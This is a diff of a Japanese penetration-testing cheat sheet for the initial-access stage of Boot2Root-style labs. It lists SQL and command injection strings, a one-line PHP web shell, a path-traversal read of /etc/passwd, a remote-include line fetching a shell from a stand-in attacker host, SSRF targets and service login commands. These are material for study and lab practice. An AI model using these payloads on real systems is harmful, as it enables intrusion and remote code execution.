@@ -29,48 +29,44 @@ Initial Access は、Recon / Enumeration で得た情報をもとに
 Enumeration で特定した Attack Surface を、  
 「侵入可能かどうか」の観点で深掘りする。
 
-### [Web](#web)
-- [SQL Injection](#sql-injectionsqli)
-- [Command Injection](#command-injectionrce)  
-- [File Upload（WebShell）](#fileuploadwebshell) 
+### Web 初期侵入
+- [SQL Injection](#websqli)
+- [Command Injection](#webcommand-injection)  
+- [File Upload（WebShell）](#webshellfile-upload) 
 - [LFI / RFI](#lfi--rfi)  
 - [SSRF](#ssrf)  
-- [認証バイパス](#認証バイパス)  
 
-### SMB
+### [SMB 初期侵入](#smb)
 - 認証情報の利用  
 - 共有フォルダから WebShell 配置  
 - バックアップファイルの取得  
 
-### FTP
+### [FTP 初期侵入](#ftp)
 - anonymous  
 - 書き込み可能か  
 - WebShell アップロード  
 
-### SSH
+### [SSH 初期侵入](#ssh)
 - 弱パスワード  
 - 公開鍵  
 - パスワードスプレー  
 
-### Database（MySQL / PostgreSQL）
+### [Database 初期侵入（MySQL / PostgreSQL）](#mysqlpostgresql)
 - 弱パスワード  
 - Web アプリの認証情報  
 - 任意クエリ実行  
 
-### Redis
-- 未認証アクセス  
-- SSH authorized_keys 書き込み
-
 ### その他の初期侵入
-- ○○
-- 
+- [RDP](#rdp)
+- [VNC](#vnc)
+- [SNNP](#snmp)
+  
 ---
 
-## Web
+## 🛠 代表コマンド（最低限）
 
-Web は最も突破口が多い。
+### 🔹Web（SQLi）
 
-### SQL Injection（SQLi）
 ```
 ' OR 1=1 --
 ' UNION SELECT ...
@@ -83,7 +79,7 @@ Web は最も突破口が多い。
 
 ---
 
-### Command Injection（RCE）
+### 🔹Web（Command Injection）
 ```
 ; id
 && whoami
@@ -95,7 +91,7 @@ Web は最も突破口が多い。
 
 ---
 
-### File Upload（WebShell）
+### 🔹WebShell（File Upload）
 ```
 <?php system($_GET['cmd']); ?>
 ```
@@ -107,7 +103,7 @@ Web は最も突破口が多い。
 
 ---
 
-### LFI / RFI
+### 🔹LFI / RFI
 ```
 ?page=../../../../etc/passwd
 ?page=http://attacker/shell.txt
@@ -119,7 +115,7 @@ Web は最も突破口が多い。
 
 ---
 
-### SSRF
+### 🔹SSRF
 ```
 http://127.0.0.1:3306
 http://localhost/admin
@@ -129,15 +125,11 @@ http://localhost/admin
 - 内部サービスの探索  
 - 認証バイパス  
 
-
-### 認証バイパス
-
 ---
 
-## SMB
-
+### 🔹SMB
 ```
-smbclient //<TARGET>/<SHARE>
+smbclient //<target>/<share>
 ```
 
 #### 確認ポイント
@@ -148,10 +140,9 @@ smbclient //<TARGET>/<SHARE>
 
 ---
 
-## FTP
-
+### 🔹FTP
 ```
-ftp <TARGET>
+ftp <target>
 ```
 
 #### 確認ポイント
@@ -161,10 +152,9 @@ ftp <TARGET>
 
 ---
 
-## SSH
-
+### 🔹SSH
 ```
-ssh user@<TARGET>
+ssh user@<target>
 ```
 
 #### 確認ポイント
@@ -174,11 +164,13 @@ ssh user@<TARGET>
 
 ---
 
-## Database
-
-### MySQL
+### 🔹MySQL/PostgreSQL
 ```
-mysql -h <TARGET> -u root -p
+mysql -h <target> -u root -p
+```
+
+```
+psql -h <TARGET> -U postgres
 ```
 
 #### 確認ポイント
@@ -188,19 +180,6 @@ mysql -h <TARGET> -u root -p
 
 ---
 
-### PostgreSQL
-```
-psql -h <TARGET> -U postgres
-```
-
----
-
-## Redis
-
-```
-redis-cli -h <TARGET>
-```
-
 #### 確認ポイント
 - 未認証アクセス  
 - SSH authorized_keys 書き込み  
@@ -208,36 +187,34 @@ redis-cli -h <TARGET>
 
 ---
 
-## その他の初期侵入
-
-### RDP
+### 🔹RDP
 ```
 xfreerdp /u:user /p:pass /v:<TARGET>
 ```
 
-### VNC
+### 🔹VNC
 ```
 vncviewer <TARGET>
 ```
 
-### SNMP
+### 🔹SNMP
 ```
 snmpwalk -v2c -c public <TARGET>
 ```
 
 ---
 
-## 初期侵入後の確認
+### 初期侵入後の確認
 
-初期侵入が成功したら、以下を確認する：
-
-### ✔ whoami  
-### ✔ id  
-### ✔ hostname  
-### ✔ pwd  
-### ✔ ls -la  
-### ✔ netstat / ss  
-### ✔ sudo -l  
+```
+whoami
+id
+hostname
+pwd
+ls -la
+netstat / ss
+sudo -l
+```
 
 これらは Boot2Root の **Local Enumeration** に続く。
 
